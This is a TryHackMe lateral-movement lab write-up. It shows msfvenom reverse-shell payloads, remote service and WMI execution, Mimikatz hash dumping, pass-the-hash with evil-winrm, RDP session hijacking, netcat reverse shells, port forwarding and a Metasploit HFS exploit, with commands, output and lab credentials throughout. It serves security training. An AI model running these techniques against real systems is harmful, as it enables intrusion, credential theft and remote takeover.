<img width="1028" height="803" alt="Screenshot 2026-02-17 142033" src="https://github.com/user-attachments/assets/c0a1b321-1d58-4039-8dc1-a7aa88092740" /># **Lateral Movement and Pivoting - TryHackMe Network**

*VPN Ip. Address: 10.150.74.3*

To start with the challenge let's add domain address to nameserver.

```bash
kali@kali:sudo sed -i '1s|^|nameserver 10.200.74.101\n|' /etc/resolv.conf
```

To start with the challenge, let's fetch the credentials for us from "*http://distributor.za.tryhackme.com/creds*".

```credentials
-->Your credentials have been generated: Username: jenna.field Password: Income1982
```

Let's ssh login with the credentials we have.

```bash
kali@kali:ssh za\\jenna.field@thmjmp2.za.tryhackme.com   
The authenticity of host 'thmjmp2.za.tryhackme.com (10.200.74.249)' can't be established.
ED25519 key fingerprint is: SHA256:hWJ3UXi9CUvCPJiW5DHV03g8j1fvIFqqI9WL79LPj3A
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:173: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'thmjmp2.za.tryhackme.com' (ED25519) to the list of known hosts.                                                                                    
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
za\jenna.field@thmjmp2.za.tryhackme.com's password: 
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

za\jenna.field@THMJMP2 C:\Users\jenna.field> 
```

# **Task - Spawning Processes Remotely**

Create a reverse shell payload with msfvenom.

```bash
kali@kali:msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.150.74.3 LPORT=4444 -f exe-service -o pwnme64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload                                                                                     
No encoder specified, outputting raw payload                                                                                                   
Payload size: 460 bytes                                                                                                                        
Final size of exe-service file: 12288 bytes                                                                                                    
Saved as: pwnme64.exe
```

Let's put the reverse shell payload in the shares of THMIIS.

```bash
kali@kali:smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/jenna_field%Income1982' -c 'put pwnme64.exe' --option="client min protocol=core"
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Use, the provided credentials in this task, as we need administrative access to perform this task.

For this exercise, we will assume we have already captured some credentials with administrative access:

```credentials
User: ZA.TRYHACKME.COM\t1_leonard.summers
Password: EZpass4ever
```

Let's login with the provided credentials for this task.

```bash
kali@kali:ssh t1_leonard.summers@thmjmp2.za.tryhackme.com
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
t1_leonard.summers@thmjmp2.za.tryhackme.com's password: 

Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>
```

Let's check if we have administrator privileges.

```bash
za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>whoami /groups                                                        

GROUP INFORMATION                                                                                                               
-----------------                                                                                                               

Group Name                                 Type             SID                                           Attributes            
                                                                                                                                                                                                                                            
========================================== ================ ============================================= ======================                                                                                                            
============================                                                                                                                                                                                                                
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabl                                                                                                            
ed by default, Enabled group                                                                                                                                                                                                                
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabl                                                                                                            
ed by default, Enabled group                                                                                                                                                                                                                
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabl                                                                                                            
ed by default, Enabled group                                                                                                                                                                                                                
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabl                                                                                                            
ed by default, Enabled group                                                                                                                                                                                                                
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabl                                                                                                            
ed by default, Enabled group                                                                                                                                                                                                                
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabl                                                                                                            
ed by default, Enabled group                                                                                                                                                                                                                
ZA\Tier 1 Admins                           Group            S-1-5-21-3330634377-1326264276-632209373-1105 Mandatory group, Enabl                                                                                                            
ed by default, Enabled group                                                                                                                                                                                                                
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabl                                                                                                            
ed by default, Enabled group                                                                                                                                                                                                                
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                         
```

So, we are Tier 1 admin. Now, we can upload our file to thmiis share.

```bash
kali@kali:smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_leonard.summers%EZpass4ever' -c 'put pwnme64.exe' --option="client min protocol=core"                                                                                                                                  
putting file pwnme64.exe as \pwnme64.exe (11.5 kB/s) (average 11.5 kB/s)
```

Start 2 listeners.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.62 • 172.17.0.1 • 172.18.0.1 • 10.150.74.3
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

```bash
kali@kali:penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.1.62 • 172.17.0.1 • 172.18.0.1 • 10.150.74.3
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

From the ssh terminal, use runas to get a reverse shell.

```bash
za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers>runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc6               
4.exe -e cmd.exe 10.150.74.3 4445"                                                                                                             
Enter the password for ZA.TRYHACKME.COM\t1_leonard.summers:                                                                                    
Attempting to start c:\tools\nc64.exe -e cmd.exe 10.150.74.3 4445 as user "ZA.TRYHACKME.COM\t1_leonard.summers" ...                            
                                                                                                                                               
za\t1_leonard.summers@THMJMP2 C:\Users\t1_leonard.summers> 
```

```bash
kali@kali:penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.1.62 • 172.17.0.1 • 172.18.0.1 • 10.150.74.3
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 10.200.74.249-WINDOWS 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/10.200.74.249-WINDOWS/2026_02_17-11_55_07-992.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
whoami
za\t1_leonard.summers

C:\Windows\system32>
```

Let's create a schedule task to run our uploaded reverse shell payload.

```bash
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create letmepwn binpath= "%windir%\pwnme64.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create letmepwn binpath= "%windir%\pwnme64.exe" start= auto
[SC] CreateService SUCCESS
```

Now, run the scheduled task.

```bash
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start letmepwn
sc.exe \\thmiis.za.tryhackme.com start letmepwn

SERVICE_NAME: letmepwn 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 4516
        FLAGS              : 

C:\Windows\system32>
```
Should receive a reverse shell on listener.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.62 • 172.17.0.1 • 172.18.0.1 • 10.150.74.3
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 10.200.74.201-WINDOWS 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/10.200.74.201-WINDOWS/2026_02_17-12_13_07-791.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>hostname
hostname
THMIIS
```

We are inside THMIIS, let's read the flag at Desktop folder.

```bash
C:\Users\t1_leonard.summers\Desktop>Flag.exe
Flag.exe
THM{MOV.....ES}
```

# **Task - Moving Laterally Using WMI**

Create a .msi reverse shell package with msfvenom.

```bash
kali@kali:msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.150.74.3 LPORT=4449 -f msi -o pwnme.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: pwnme.msi
```

Similar to above task, upload to the THMIIS share.

```bash
kali@kali:smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_corine.waters%Korine.1994' -c 'put pwnme.msi' --option="client min protocol=core"
putting file pwnme.msi as \pwnme.msi (44.1 kB/s) (average 44.1 kB/s)
```

Start a listener.

```bash
kali@kali:penelope -p 4449
[+] Listening for reverse shells on 0.0.0.0:4449 →  127.0.0.1 • 192.168.1.62 • 172.17.0.1 • 172.18.0.1 • 10.150.74.3
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Let's login via ssh with given credentials.

```bash
kali@kali:ssh t1_corine.waters@za.tryhackme.com@thmjmp2.za.tryhackme.com
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
t1_corine.waters@za.tryhackme.com@thmjmp2.za.tryhackme.com's password: 


Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

za\t1_corine.waters@THMJMP2 C:\Users\t1_corine.waters> 
```

Enable powershell.

```bash
za\t1_corine.waters@THMJMP2 C:\Users\t1_corine.waters>powershell                                                                
Windows PowerShell                                                                                                              
Copyright (C) 2016 Microsoft Corporation. All rights reserved.                                                                  

PS C:\Users\t1_corine.waters>   
```

Set the required variables to install the package in THMIIS.

```powershell
PS C:\Users\t1_corine.waters> $username = 't1_corine.waters';                                                                   
PS C:\Users\t1_corine.waters> $password = 'Korine.1994';                                                                        
PS C:\Users\t1_corine.waters> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;                           
PS C:\Users\t1_corine.waters> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;    
PS C:\Users\t1_corine.waters> $Opt = New-CimSessionOption -Protocol DCOM                                                        
PS C:\Users\t1_corine.waters> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop                                                                                                     
PS C:\Users\t1_corine.waters>
```

The variables are set, let's invoke the installation.

```powershell
PS C:\Users\t1_corine.waters> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\pwnme.msi"; Options = ""; AllUsers = $false}                                                        

ReturnValue PSComputerName                                                                                                      
----------- --------------                                                                                                      
       1603 thmiis.za.tryhackme.com                                                                                             


PS C:\Users\t1_corine.waters> 
```

Should receive the reverse shell.

```bash
kali@kali:penelope -p 4449
[+] Listening for reverse shells on 0.0.0.0:4449 →  127.0.0.1 • 192.168.1.62 • 172.17.0.1 • 172.18.0.1 • 10.150.74.3
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from THMIIS~10.200.74.201-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/THMIIS~10.200.74.201-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_02_17-12_47_05-617.log 📜                                                                                                                                          
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>hostname
hostname
THMIIS

C:\Windows\system32>
```

Read the flag at Desktop folder.

```bash
C:\Users\t1_corine.waters\Desktop>Flag.exe
Flag.exe
THM{MO.....UN}
```

# **Task - Use of Alternate Authentication Material**

Let's login via ssh with the provided credentials.

```bash
kali@kali:ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
za\t2_felicia.dean@thmjmp2.za.tryhackme.com's password: 

Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

za\t2_felicia.dean@THMJMP2 C:\Users\t2_felicia.dean> 
```

Run this command to launch a PowerShell script like Mimikatz while ignoring all security restrictions and warnings that would normally block it.

```powershell
PS C:\Users\t2_felicia.dean> powershell.exe -ExecutionPolicy Bypass                                                             
Windows PowerShell                                                                                                              
Copyright (C) 2016 Microsoft Corporation. All rights reserved.                                                                  
```

```powershell
PS C:\Users\t2_felicia.dean> ls C:/tools                                                                                          
                                                                                                                                               
                                                                                                                                               
    Directory: C:\tools                                                                                                                        
                                                                                                                                               
                                                                                                                                               
Mode                LastWriteTime         Length Name                                                                                          
----                -------------         ------ ----                                                                                          
d-----        6/19/2022   5:38 AM                socat                                                                                         
------        8/10/2021   3:22 PM        1355680 mimikatz.exe                                                                                  
-a----        6/14/2022   8:27 PM          45272 nc64.exe                                                                                      
-a----        4/19/2022   9:17 PM        1078672 PsExec64.exe                                                                                  
-a----        3/16/2022   5:19 PM         906752 SharpHound.exe 
```

We have mimikatz in our tools folder.

```powershell
PS C:\Users\t2_felicia.dean> C:\tools\mimikatz.exe                                                                                             
                                                                                                                                               
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53                                                                                   
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                    
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                       
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                                                                                        
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                      
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/                                                                      
                                                                                                                                               
mimikatz #  
```

Elevate the privileges.

```bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

512     {0;000003e7} 1 D 16211          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00185bb4} 0 D 1716055     ZA\t2_felicia.dean      S-1-5-21-3330634377-1326264276-632209373-4605   (12g,24p) Primary
 * Thread Token  : {0;000003e7} 1 D 1882380     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```

Let's drop the hashes.

```bash
mimikatz # sekurlsa::msv                                                                                                                       
                                                                                                                                               
Authentication Id : 0 ; 1596340 (00000000:00185bb4)                                                                                            
Session           : NetworkCleartext from 0                                                                                                    
User Name         : t2_felicia.dean
.
.
.
.
.
Authentication Id : 0 ; 675303 (00000000:000a4de7)                                                                                             
Session           : RemoteInteractive from 3                                                                                                   
User Name         : t1_toby.beck                                                                                                               
Domain            : ZA                                                                                                                         
Logon Server      : THMDC                                                                                                                      
Logon Time        : 2/17/2026 7:03:02 AM                                                                                                       
SID               : S-1-5-21-3330634377-1326264276-632209373-4607                                                                              
        msv :                                                                                                                                  
         [00000003] Primary                                                                                                                    
         * Username : t1_toby.beck                                                                                                             
         * Domain   : ZA                                                                                                                       
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                                                                                         
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                                                                                 
         * DPAPI    : d9cd92937c7401805389fbb51260c45f 
```

We have NTLM hash for user t1_toby.beck. Now, we can login with this hash with evil-winrm.

```bash
kali@kali:evil-winrm -i 10.200.74.201 -u t1_toby.beck -H 533f1bd576caa912bdb9da284bbc60fe
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\t1_toby.beck\Documents> whoami
za\t1_toby.beck
*Evil-WinRM* PS C:\Users\t1_toby.beck\Documents> hostname
THMIIS
```

We are in. Let's read the flag.

```bash
*Evil-WinRM* PS C:\Users\t1_toby.beck\Desktop> ./Flag.exe
THM{NO.....ED}
```

#**Task - Abusing User Behaviour**

Let's gather the credentials for user wihth administrative privileges from "*http://distributor.za.tryhackme.com/creds_t2*".

```credentials
-->Your credentials have been generated: Username: t2_kelly.blake Password: 8LXuPeNHZFFG
```

We can login using RDP (Xfreerdp3).

```bash
kali@kali:xfreerdp3 /v:thmjmp2.za.tryhackme.com /u:t2_kelly.blake /p:8LXuPeNHZFFG
[14:00:16:007] [45679:0000b26f] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Using /p is insecure
[14:00:16:007] [45679:0000b26f] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Passing credentials or secrets via command line might expose these in the process list
[14:00:16:007] [45679:0000b26f] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
[14:00:16:007] [45679:0000b26f] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]:   - /args-from: pipe in arguments from stdin, file or file descriptor
```

<img width="1031" height="800" alt="Screenshot 2026-02-17 141108" src="https://github.com/user-attachments/assets/69ad7644-8923-46c6-9c5e-dedb3a193f76" />

Run psexec to view other user's session in the server.

```powershell
C:\Windows\system32>C:\tools\psexec64.exe -accepteula -s -i cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com
```

List the sessions.

```powershell
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>query session
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
 console                                     1  Conn
                   t1_toby.beck5             2  Disc
                   t1_toby.beck              3  Disc
                   t1_toby.beck1             4  Disc
                   t1_toby.beck2             5  Disc
                   t1_toby.beck3             6  Disc
                   t1_toby.beck4             7  Disc
>rdp-tcp#59        t2_kelly.blake            8  Active
                   jenna.field               9  Disc
 rdp-tcp                                 65536  Listen

C:\Windows\system32>
```

Our session is rdp-tcp#59, we can switch to t1_toby.beck by assignung his Disc Id to our session.

```powershell
C:\Windows\system32>tscon 3 /dest:rdp-tcp#59
```

<img width="1028" height="803" alt="Screenshot 2026-02-17 142033" src="https://github.com/user-attachments/assets/e150f38c-821e-4268-ae61-1ed9c332a2ac" />

We find our flag in the screeen.

#**Task - Port Forwarding**

Let's login via ssh with the credentials we generated at first.

```bash
kali@kali:ssh za\\jenna.field@thmjmp2.za.tryhackme.com                                                                                             
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
za\jenna.field@thmjmp2.za.tryhackme.com's password: 
Microsoft Windows [Version 10.0.14393]                                                                                          
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            

za\jenna.field@THMJMP2 C:\Users\jenna.field> 
```

Let's run powershell.

```bash
za\jenna.field@THMJMP2 C:\Users\jenna.field>powershell                                                                          
Windows PowerShell                                                                                                              
Copyright (C) 2016 Microsoft Corporation. All rights reserved.                                                                  
```

Let's use socat to forward the THMIIS 3389(RDP) port, so that we can login.

```powershell
PS C:\tools\socat> ./socat.exe TCP4-LISTEN:12349,fork TCP4:THMIIS.za.tryhackme.com:3389                                                        
```

Now, we can login via RDP to THMIIS with the provided credentials.

```bash
kali@kali:xfreerdp3 /v:THMJMP2.za.tryhackme.com:12349 /u:t1_thomas.moore /p:MyPazzw3rd2020                                                           
[14:39:00:659] [55856:0000da30] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Using /p is insecure
[14:39:00:659] [55856:0000da30] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Passing credentials or secrets via command line might expose these in the process list
[14:39:00:659] [55856:0000da30] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
[14:39:00:659] [55856:0000da30] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]:   - /args-from: pipe in arguments from stdin, file or file descriptor
```

We get the flag by running flag.bat at Desktop folder.

```powershell
C:\Users\t1_thomas.moore\Desktop>flag.exe
THM{SI.....HT}

C:\Users\t1_thomas.moore\Desktop>pause
Press any key to continue . . .
```

Since, we know THMDC has a vulnerable HFS at port 80, we can port forward it. Similarly, as this exploit needs a listener and a server, we create 2 more port forwards so that, we can send the payload, and receive the payload from our attacker machine via THMJMP2, as we cannot directly access the THMDC.

```bash
kali@kali:ssh za\\jenna.field@thmjmp2.za.tryhackme.com -L 8888:thmdc.za.tryhackme.com:80 -R 6667:127.0.0.1:6666 -R 8082:127.0.0.1:8081 -N            
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
za\jenna.field@thmjmp2.za.tryhackme.com's password: 
```

From THMJMP2, create 2 listener, and forward them to our attacker machine.

```powersell
PS C:\tools\socat> ./socat.exe TCP4-LISTEN:6666,fork,bind=0.0.0.0 TCP4:127.0.0.1:6667                                           
```
```powershell
PS C:\tools\socat> ./socat.exe TCP4-LISTEN:8081,fork,bind=0.0.0.0 TCP4:127.0.0.1:8082                                                          
```

Set the metasploit, and configure all options.

```bash
msf exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, soc
                                         ks5h, http, sapni
   RHOSTS     127.0.0.1        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.ht
                                         ml
   RPORT      8888             yes       The target port (TCP)
   SRVHOST    127.0.0.1        yes       The local host or network interface to listen on. This must be an address on the local machine or 0.
                                         0.0.0 to listen on all addresses.
   SRVPORT    8081             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/shell_reverse_tcp):

   Name      Current Setting           Required  Description
   ----      ---------------           --------  -----------
   EXITFUNC  process                   yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     thmjmp2.za.tryhackme.com  yes       The listen address (an interface may be specified)
   LPORT     6666                      yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


View the full module info with the info, or info -d command.

msf exploit(windows/http/rejetto_hfs_exec) > 
```

All the configurations are set, now we can run the exploit.

```bash
msf exploit(windows/http/rejetto_hfs_exec) > run
[*] Started reverse TCP handler on 127.0.0.1:6666 
[*] Using URL: http://thmjmp2.za.tryhackme.com:8081/pBC471eLk7GXbr
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /pBC471eLk7GXbr
[!] Tried to delete %TEMP%\unugwe.vbs, unknown result
[*] Command shell session 1 opened (127.0.0.1:6666 -> 127.0.0.1:47874) at 2026-02-17 15:17:22 +0545
[*] Server stopped.

Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\hfs>
-----
          
C:\hfs>
```

Read the final flag, and end this challenge.

```bash
C:\hfs>type flag.txt
type flag.txt
THM{FO.....LL}
```
